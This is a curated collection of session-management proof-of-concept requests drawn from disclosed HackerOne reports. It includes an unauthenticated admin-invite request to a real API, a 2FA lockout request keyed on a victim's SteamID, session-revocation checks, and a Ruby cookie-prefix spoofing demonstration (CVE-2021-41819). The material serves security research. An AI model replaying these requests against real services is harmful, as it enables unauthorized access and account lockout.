# Session Management Flaws  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1319892](https://hackerone.com/reports/1319892)  -  Possible to invite any team member without being logged in. [ Session Management Issue ]
*medium*

```http
POST /studio/invitations?_ga=1033804257.1629921862&tenantId=583b9369-f31c-4355-bcc4-785aad9cf78f HTTP/2
Host: api.courier.com
Content-Type: application/json; charset=UTF-8
Content-Length: 57
Origin: https://www.trycourier.app
Authorization: eyJraWQiOiJPRTlwVkdlQUtCVTNxMnFlTnFPWXB6YVpobm9FK1NnaUYwdGhtMkFaSU1nPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJiN2UzNzI2Ny0zOWQwLTQwNzUtOTVlMS01NTIyYzNhOWRiM2YiLCJhdWQiOiI1ZjRmbWVjMnFudXNjcDg5cWJ0OG5zdWZ0aiIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJldmVudF9pZCI6IjQwYmU4Y2UzLTkxZDAtNGU0Yi1hOWE1LTBmZmVkOWUxMjAzYiIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNjI5OTIzOTU3LCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9wdGJSenFpTHciLCJjb2duaXRvOnVzZXJuYW1lIjoiYjdlMzcyNjctMzlkMC00MDc1LTk1ZTEtNTUyMmMzYTlkYjNmIiwiZXhwIjoxNjI5OTYwMTkzLCJpYXQiOjE2Mjk5NTY1OTMsImVtYWlsIjoiaWxvdmVidWdib3VudHlAZ21haWwuY29tIn0.gbqkE49TaxOgYwCnSkAUeausim-Phn-D1lWu_ZEuwFRGP1lBpzzNnlA3-AOCfPDjjAcueeHZJtWyMYBuDTKzFE5ZONOwo1LOyDS8TU--Ud_NAw1NO52HmeQZHGGstk4mkYd7ceAco1YpakRjaJ3SsSZlafOIk6jw6y82_ylodr1_F8iNY5--mqW5D_ioKSgcjQGpNj_ytNIQdCPsowz-LWOoNaEtwT4MjydYB1SJ1HtLNKyVatfdEWAS3FDsBaR2nOBG_Yp7hoC4leuiYTtSkPR0PlEJBqBlbRR8FJHF4-Ksa7x3D-3tQvLHq62HyVMH25QHuyQYvKbyLEFKEEr8HQ
Referer: https://www.trycourier.app/

{"email":"trycourier@yopmail.com","role":"ADMINISTRATOR"}
# … truncated …
```

## 2. [#1179232](https://hackerone.com/reports/1179232)  -  Able to blocking users with 2fa from login into their accounts by just knowing the SteamID
*medium, $300*

```http
POST /login/confirm HTTP/1.1
Host: cs.money
Content-Length: 28
Cookie: steamid=<victim_steam_id>;

{"token":"foo","code":"foo"}
```

## 3. [#1172205](https://hackerone.com/reports/1172205)  -  Insufficient session expiration in the **com.shopify.ping** android app
*low*

```http
DELETE /api/v1/logout HTTP/1.1
authorization: Bearer atkn_**********************************
Host: accounts.shopify.com
Cookie: __cfduid=***********; _y=***************; _shopify_y=***************; request_method=POST
```

## 4. [#1172205](https://hackerone.com/reports/1172205)  -  Insufficient session expiration in the **com.shopify.ping** android app
*low*

```http
GET /oauth/userinfo HTTP/1.1
authorization: Bearer ***************
```

## 5. [#1547684](https://hackerone.com/reports/1547684)  -  Disconnecting an external login provider does not revoke session
*medium, $1,600*

```json
{{attacker prespective}}
```

## 6. [#1547684](https://hackerone.com/reports/1547684)  -  Disconnecting an external login provider does not revoke session
*medium, $1,600*

```json
{{victims prespective}}
```

## 7. [#1464396](https://hackerone.com/reports/1464396)  -  Ruby CVE-2021-41819: Cookie Prefix Spoofing in CGI::Cookie.parse
*high, $2,000*

```ruby
❯ ruby -v
ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-darwin19]

❯ irb
irb(main):001:0> require 'cgi'
=> true

irb(main):002:0> cookie_a = CGI::Cookie.parse("__%48ost-evil=evil;__Host-evil=abc")
irb(main):003:0> cookie_a["__Host-evil"]
=> #<CGI::Cookie: "__Host-evil=evil&abc; path=">
irb(main):004:0> cookie_a["__Host-evil"].to_a
=> ["evil", "abc"]

irb(main):005:0> cookie_b = CGI::Cookie.parse("%48oge=evil;Hoge=abc;Foo=xxx")
irb(main):006:0> cookie_b["Hoge"].to_a
=> ["evil", "abc"]
irb(main):007:0> cookie_b["Foo"].to_a
=> ["xxx"]
```

## 8. [#1319892](https://hackerone.com/reports/1319892)  -  Possible to invite any team member without being logged in. [ Session Management Issue ]
*medium*

```javascript
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 135
Date: Thu, 26 Aug 2021 06:13:32 GMT
X-Amzn-Requestid: 4785534c-81b7-454e-b89e-ffee8fc9014f
Access-Control-Allow-Origin: https://www.trycourier.app
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Amzn-Remapped-Content-Length: 135
X-Ratelimit-Remaining: 34
X-Amz-Apigw-Id: EqSZ4EhOIAMFdHw=
Vary: Origin
X-Ratelimit-Limit: 50
X-Content-Type-Options: nosniff
X-Amzn-Trace-Id: Root=1-6127310b-7cd190a16e3ea71251218f51
X-Cache: Miss from cloudfront
Via: 1.1 239ab88732bfa02ab05c2b2116638aeb.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: TPE51-C1
X-Amz-Cf-Id: b4UjaeoBTQuIFaG-eI-Fvyv44U_i8HIVnX_DaBlHqS7VQDjF0kOzNA==

{"code":"eyJlbmNyeXB0ZWREYXRhIjoiMWFjYjRlNzU4MjNmNDhlZWJlNTJjZWEwMTE5ZGIxOTkiLCJpdiI6IjQ3ZWQyZmNmZGVhM2E4OTYyM2VkYTE1Y2U0OTFkMzE2In0="}
```

## 9. [#417382](https://hackerone.com/reports/417382)  -  Revoking user session in https://hackerone.com/settings/sessions does not revoke the GraphQL query session
*low, $500*

```
HTTP/1.1 200 OK
Date: Tue, 02 Oct 2018 02:01:20 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: no-cache, no-store
Content-Disposition: inline; filename="response."
X-Request-Id: 5ffd271a-bccd-4105-8991-4ed97769b1a0
Set-Cookie: ███
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare
CF-RAY: 4633948f1bbba2f6-HKG
Content-Length: 24732

████
# … truncated …
```
